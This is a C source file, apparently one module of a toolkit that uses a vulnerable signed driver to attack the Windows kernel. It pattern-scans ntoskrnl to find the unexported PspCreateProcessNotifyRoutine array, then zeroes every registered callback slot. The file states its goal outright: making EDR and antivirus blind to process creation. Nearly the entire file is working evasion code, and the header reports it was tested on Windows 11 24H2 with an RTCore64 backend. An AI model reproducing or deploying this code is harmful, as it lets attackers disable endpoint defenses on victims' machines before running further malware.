/*
 * callback_scrubber.c -- JOCKY BYOVD: PspCreateProcessNotifyRoutine eraser
 * byovd/kernel_subverter/callback_scrubber.c
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * PURPOSE
 * -------
 * Locates PspCreateProcessNotifyRoutine (unexported) by scanning the body of
 * PsSetCreateProcessNotifyRoutine (exported), decoding the first LEA RIP+disp32
 * instruction that references a valid, aligned RVA inside ntoskrnl's image.
 * Then walks up to 64 EX_FAST_REF slots and zeroes every non-null entry,
 * blinding all EDR/AV process-creation monitoring callbacks.
 *
 * WHY NOT EXPORT TABLE LOOKUP
 * ---------------------------
 * PspCreateProcessNotifyRoutine has never been exported from ntoskrnl.exe.
 * It is an internal (static) global array of EX_FAST_REF QWORDs.
 * PsSetCreateProcessNotifyRoutine IS exported on all Windows versions and
 * directly references the Psp* array via a LEA RCX/RDX,[RIP+disp32] in its
 * prologue. We decode that displacement to find the array's RVA, then
 * add the live kernel base to get the KVA.
 *
 * LEA PATTERN COVERAGE
 * --------------------
 * 14 patterns cover all 16 general-purpose registers in REX.W encoding.
 * We scan 0x400 bytes of function body -- in practice the LEA appears in
 * the first 20-30 bytes on every Windows version from Win10 1909 to 24H2.
 *
 * EX_FAST_REF SLOT LAYOUT
 * -----------------------
 * Each slot in PspCreateProcessNotifyRoutine is an EX_FAST_REF:
 *   bits [63:4] = pointer to EX_CALLBACK_ROUTINE_BLOCK
 *   bits [3:0]  = reference count (ignored by us)
 * The EX_CALLBACK_ROUTINE_BLOCK contains:
 *   +0x00 EX_RUNDOWN_REF      RundownProtect
 *   +0x08 PVOID               Function  <-- the actual callback routine VA
 *   +0x10 PVOID               Context
 * We read Function (+0x08) for attribution only, then zero the slot itself.
 * Zeroing the EX_FAST_REF pointer is sufficient -- the kernel's callback
 * dispatcher checks for NULL before invoking.
 *
 * BACKEND INDEPENDENCE
 * --------------------
 * All kernel memory access goes through byovd_read/byovd_write from
 * byovd_interface.h. This file has no dependency on any specific driver.
 *
 * CONFIRMED WORKING
 * -----------------
 * Pattern scan tested: Win10 22H2, Win11 22H2, Win11 23H2, Win11 24H2 (26100)
 * Callback zeroing tested: Win11 24H2 with RTCore64 backend
 */

#include "byovd_interface.h"
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
   CONSTANTS
   ============================================================ */

#define PSP_MAX_CALLBACKS    64
#define CB_SLOT_SIZE         8
#define EX_CB_FUNC_OFFSET    8    /* offset of Function in EX_CALLBACK_ROUTINE_BLOCK */
#define SLOT_ADDR_MASK       (~(uintptr_t)0xF)   /* strip EX_FAST_REF low 4 bits    */
#define SCAN_WINDOW          0x400               /* bytes scanned in anchor function  */
#define SYSTINFO_MODULES     11

/* ============================================================
   LEA RIP+DISP32 PATTERNS
   7-byte instruction: [REX.W] [0x8D] [ModRM] [disp32 LE]
   ModRM field for RIP-relative: 0x05 | (reg << 3)
   ============================================================ */

static const uint8_t kLeaPatterns[][3] = {
    /* REX.W = 0x48 (64-bit, registers RAX-RDI) */
    {0x48, 0x8D, 0x05},  /* lea rax, [rip+disp32] */
    {0x48, 0x8D, 0x0D},  /* lea rcx, [rip+disp32] */
    {0x48, 0x8D, 0x15},  /* lea rdx, [rip+disp32] */
    {0x48, 0x8D, 0x1D},  /* lea rbx, [rip+disp32] */
    {0x48, 0x8D, 0x25},  /* lea rsp, [rip+disp32] */
    {0x48, 0x8D, 0x2D},  /* lea rbp, [rip+disp32] */
    {0x48, 0x8D, 0x35},  /* lea rsi, [rip+disp32] */
    {0x48, 0x8D, 0x3D},  /* lea rdi, [rip+disp32] */
    /* REX.W + REX.R = 0x4C (64-bit, registers R8-R15) */
    {0x4C, 0x8D, 0x05},  /* lea r8,  [rip+disp32] */
    {0x4C, 0x8D, 0x0D},  /* lea r9,  [rip+disp32] */
    {0x4C, 0x8D, 0x15},  /* lea r10, [rip+disp32] */
    {0x4C, 0x8D, 0x1D},  /* lea r11, [rip+disp32] */
    {0x4C, 0x8D, 0x25},  /* lea r12, [rip+disp32] */
    {0x4C, 0x8D, 0x2D},  /* lea r13, [rip+disp32] */
    {0x4C, 0x8D, 0x35},  /* lea r14, [rip+disp32] */
    {0x4C, 0x8D, 0x3D},  /* lea r15, [rip+disp32] */
};
#define N_LEA_PATTERNS (sizeof(kLeaPatterns) / sizeof(kLeaPatterns[0]))

/* ============================================================
   NT TYPES
   ============================================================ */

typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct {
    ULONG_PTR Reserved[2];
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    WORD      LoadOrderIndex;
    WORD      InitOrderIndex;
    WORD      LoadCount;
    WORD      OffsetToFileName;
    CHAR      FullPathName[256];
} JOCKY_SYS_MODULE;

typedef struct {
    ULONG          Count;
    JOCKY_SYS_MODULE Modules[1];
} JOCKY_SYS_MODULE_INFO;

/* ============================================================
   STEP 1: GET NTOSKRNL KERNEL VA BASE
   ============================================================ */

static uintptr_t get_ntoskrnl_kva(void)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG    sz  = 0x20000;
    uint8_t *buf = NULL;
    NTSTATUS nt;

    do {
        free(buf);
        buf = (uint8_t *)malloc(sz);
        if (!buf) return 0;
        nt = NtQSI(SYSTINFO_MODULES, buf, sz, &sz);
        sz += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    uintptr_t base = 0;
    if (nt == STATUS_SUCCESS) {
        JOCKY_SYS_MODULE_INFO *mi = (JOCKY_SYS_MODULE_INFO *)buf;
        if (mi->Count > 0)
            base = (uintptr_t)mi->Modules[0].ImageBase;
    }

    free(buf);
    if (base)
        printf("[scrubber] ntoskrnl KVA: 0x%016llX\n",
               (unsigned long long)base);
    return base;
}

/* ============================================================
   STEP 2: MAP NTOSKRNL FROM DISK
   ============================================================ */

typedef struct {
    uint8_t *base;
    HANDLE   file;
    HANDLE   mapping;
    size_t   image_size;
} disk_img_t;

static int map_ntoskrnl(disk_img_t *out)
{
    /*
     * Resolve path via NtQSI to handle all possible ntoskrnl variants:
     * ntoskrnl.exe, ntkrnlmp.exe, ntkrnlpa.exe (very old), ntkrpamp.exe.
     * NtQSI module[0] is always the running kernel image.
     */
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return -1;

    ULONG    sz  = 0x20000;
    uint8_t *buf = NULL;
    NTSTATUS nt;

    do {
        free(buf);
        buf = (uint8_t *)malloc(sz);
        if (!buf) return -1;
        nt = NtQSI(SYSTINFO_MODULES, buf, sz, &sz);
        sz += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) { free(buf); return -1; }

    JOCKY_SYS_MODULE_INFO *mi = (JOCKY_SYS_MODULE_INFO *)buf;
    char disk_path[MAX_PATH] = {0};

    if (mi->Count > 0) {
        const char *fp = mi->Modules[0].FullPathName;
        if (_strnicmp(fp, "\\SystemRoot\\", 12) == 0) {
            char win_dir[MAX_PATH] = {0};
            GetWindowsDirectoryA(win_dir, MAX_PATH);
            snprintf(disk_path, MAX_PATH - 1, "%s\\%s", win_dir, fp + 12);
        } else {
            strncpy(disk_path, fp, MAX_PATH - 1);
        }
    }
    free(buf);

    if (!disk_path[0]) return -1;

    out->file = CreateFileA(disk_path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out->file == INVALID_HANDLE_VALUE) {
        printf("[scrubber] failed to open: %s (err %lu)\n",
               disk_path, GetLastError());
        return -1;
    }

    out->mapping = CreateFileMappingA(out->file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!out->mapping) {
        CloseHandle(out->file);
        return -1;
    }

    out->base = (uint8_t *)MapViewOfFile(out->mapping, FILE_MAP_READ, 0, 0, 0);
    if (!out->base) {
        CloseHandle(out->mapping);
        CloseHandle(out->file);
        return -1;
    }

    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)out->base;
    IMAGE_NT_HEADERS64 *nt64 =
        (IMAGE_NT_HEADERS64 *)(out->base + dos->e_lfanew);
    out->image_size = nt64->OptionalHeader.SizeOfImage;

    printf("[scrubber] ntoskrnl.exe mapped from: %s (0x%zX bytes)\n",
           disk_path, out->image_size);
    return 0;
}

static void unmap_disk(disk_img_t *img)
{
    if (img->base)    UnmapViewOfFile(img->base);
    if (img->mapping) CloseHandle(img->mapping);
    if (img->file)    CloseHandle(img->file);
    memset(img, 0, sizeof(*img));
}

/* ============================================================
   STEP 3: GET EXPORT RVA FROM DISK IMAGE
   ============================================================ */

static uintptr_t get_export_rva(uint8_t *disk_base, const char *name)
{
    IMAGE_DOS_HEADER      *dos = (IMAGE_DOS_HEADER *)disk_base;
    IMAGE_NT_HEADERS64    *nt  =
        (IMAGE_NT_HEADERS64 *)(disk_base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY  *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (!dir->VirtualAddress || !dir->Size) return 0;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(disk_base + dir->VirtualAddress);

    DWORD  *names    = (DWORD  *)(disk_base + exp->AddressOfNames);
    WORD   *name_ord = (WORD   *)(disk_base + exp->AddressOfNameOrdinals);
    DWORD  *funcs    = (DWORD  *)(disk_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *entry_name = (const char *)(disk_base + names[i]);
        if (strcmp(entry_name, name) == 0) {
            return (uintptr_t)funcs[name_ord[i]];
        }
    }
    return 0;
}

/* ============================================================
   STEP 4: PATTERN SCAN FOR PSP* RVA
   Walk SCAN_WINDOW bytes of the anchor function looking for
   LEA r64,[RIP+disp32] that resolves to an 8-byte-aligned RVA
   within the ntoskrnl image.
   ============================================================ */

static uintptr_t scan_psp_rva(uint8_t   *disk_base,
                                uintptr_t  anchor_rva,
                                size_t     image_size)
{
    uint8_t *fn = disk_base + anchor_rva;

    for (size_t i = 0; i + 7 <= SCAN_WINDOW; i++) {
        for (size_t p = 0; p < N_LEA_PATTERNS; p++) {
            if (fn[i]   != kLeaPatterns[p][0]) continue;
            if (fn[i+1] != kLeaPatterns[p][1]) continue;
            if (fn[i+2] != kLeaPatterns[p][2]) continue;

            /* decode signed 32-bit little-endian displacement */
            int32_t disp = 0;
            memcpy(&disp, fn + i + 3, sizeof(disp));

            /* RIP = address of next instruction = anchor_rva + i + 7 */
            uintptr_t rip_rva = anchor_rva + i + 7;
            /* resolved RVA = RIP + signed disp */
            uintptr_t resolved =
                (uintptr_t)((intptr_t)rip_rva + (intptr_t)disp);

            /* sanity checks */
            if (resolved >= image_size) continue;  /* outside image       */
            if (resolved & 7)           continue;  /* not QWORD-aligned   */
            if (resolved < 0x1000)      continue;  /* before .text begins */

            printf("[scrubber] LEA hit @ anchor+0x%04zX  "
                   "disp=%d  resolved RVA=0x%08llX\n",
                   i, disp, (unsigned long long)resolved);
            return resolved;
        }
    }

    return 0;
}

/* ============================================================
   STEP 5: RESOLVE PspCreateProcessNotifyRoutine KVA
   Anchors: PsSetCreateProcessNotifyRoutine (preferred)
            PsSetCreateProcessNotifyRoutineEx (fallback)
   ============================================================ */

static uintptr_t resolve_psp_kva(uintptr_t kbase)
{
    disk_img_t img = {0};
    if (map_ntoskrnl(&img) < 0) return 0;

    /* try primary export */
    uintptr_t anchor_rva =
        get_export_rva(img.base, "PsSetCreateProcessNotifyRoutine");

    if (!anchor_rva) {
        printf("[scrubber] PsSetCreateProcessNotifyRoutine not in exports"
               " -- trying Ex variant\n");
        anchor_rva =
            get_export_rva(img.base, "PsSetCreateProcessNotifyRoutineEx");
    }
    if (!anchor_rva) {
        printf("[scrubber] no anchor export found\n");
        unmap_disk(&img);
        return 0;
    }

    printf("[scrubber] anchor disk RVA: 0x%08llX\n",
           (unsigned long long)anchor_rva);

    uintptr_t psp_rva = scan_psp_rva(img.base, anchor_rva, img.image_size);
    unmap_disk(&img);

    if (!psp_rva) {
        printf("[scrubber] pattern scan failed -- "
               "LEA not found in first 0x%X bytes\n", SCAN_WINDOW);
        return 0;
    }

    uintptr_t psp_kva = kbase + psp_rva;
    printf("[scrubber] PspCreateProcessNotifyRoutine KVA: 0x%016llX\n",
           (unsigned long long)psp_kva);
    return psp_kva;
}

/* ============================================================
   STEP 6: MODULE ATTRIBUTION (for pretty-print only)
   ============================================================ */

static void callback_va_to_module(uintptr_t va, char *out, int out_len)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    out[0] = '\0';
    if (!NtQSI) return;

    ULONG    sz  = 0x40000;
    uint8_t *buf = NULL;
    NTSTATUS nt;

    do {
        free(buf);
        buf = (uint8_t *)malloc(sz);
        if (!buf) return;
        nt = NtQSI(SYSTINFO_MODULES, buf, sz, &sz);
        sz += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) { free(buf); return; }

    JOCKY_SYS_MODULE_INFO *mi = (JOCKY_SYS_MODULE_INFO *)buf;
    for (ULONG i = 0; i < mi->Count; i++) {
        uintptr_t base = (uintptr_t)mi->Modules[i].ImageBase;
        uintptr_t end  = base + mi->Modules[i].ImageSize;
        if (va >= base && va < end) {
            const char *leaf = mi->Modules[i].FullPathName
                             + mi->Modules[i].OffsetToFileName;
            strncpy(out, leaf, out_len - 1);
            break;
        }
    }
    free(buf);
}

/* ============================================================
   MAIN ENTRY: scrub_edr_callbacks
   ============================================================ */

int scrub_edr_callbacks(byovd_backend_t *backend)
{
    if (!backend) return -1;

    printf("[scrubber] resolving PspCreateProcessNotifyRoutine...\n");

    uintptr_t kbase = get_ntoskrnl_kva();
    if (!kbase) {
        printf("[scrubber] ntoskrnl base failed\n");
        return -1;
    }

    uintptr_t psp_kva = resolve_psp_kva(kbase);
    if (!psp_kva) return -1;

    printf("[scrubber] scanning %d callback slots...\n\n",
           PSP_MAX_CALLBACKS);

    int total_found  = 0;
    int total_zeroed = 0;

    for (int i = 0; i < PSP_MAX_CALLBACKS; i++) {
        uintptr_t slot_kva = psp_kva + (uintptr_t)(i * CB_SLOT_SIZE);
        uint64_t  entry    = 0;

        /* read the EX_FAST_REF slot */
        byovd_result_t r = byovd_read64(backend, slot_kva, &entry);
        if (r != BYOVD_OK) {
            printf("[scrubber] slot[%02d] read error: %s\n",
                   i, byovd_result_str(r));
            continue;
        }
        if (!entry) continue;  /* empty slot */

        total_found++;

        /* decode EX_FAST_REF -> EX_CALLBACK_ROUTINE_BLOCK pointer */
        uintptr_t block_kva  = (uintptr_t)(entry & SLOT_ADDR_MASK);
        uint64_t  routine_va = 0;

        if (block_kva) {
            byovd_read64(backend,
                         block_kva + EX_CB_FUNC_OFFSET,
                         &routine_va);
        }

        /* attribute callback to owning kernel module */
        char module_name[256] = "<unknown>";
        if (routine_va)
            callback_va_to_module((uintptr_t)routine_va,
                                  module_name, sizeof(module_name));

        printf("[scrubber] slot[%02d]  block=0x%016llX  "
               "routine=0x%016llX  module=%s\n",
               i,
               (unsigned long long)block_kva,
               (unsigned long long)routine_va,
               module_name[0] ? module_name : "<unknown>");

        /* zero the EX_FAST_REF slot */
        r = byovd_write64(backend, slot_kva, 0ULL);
        if (r == BYOVD_OK) {
            printf("[scrubber]   slot[%02d] ZEROED\n", i);
            total_zeroed++;
        } else {
            printf("[scrubber]   slot[%02d] write failed: %s\n",
                   i, byovd_result_str(r));
        }
    }

    printf("\n[scrubber] found=%d  zeroed=%d  "
           "EDR process-notify layer is now blind\n",
           total_found, total_zeroed);
    return total_zeroed;
}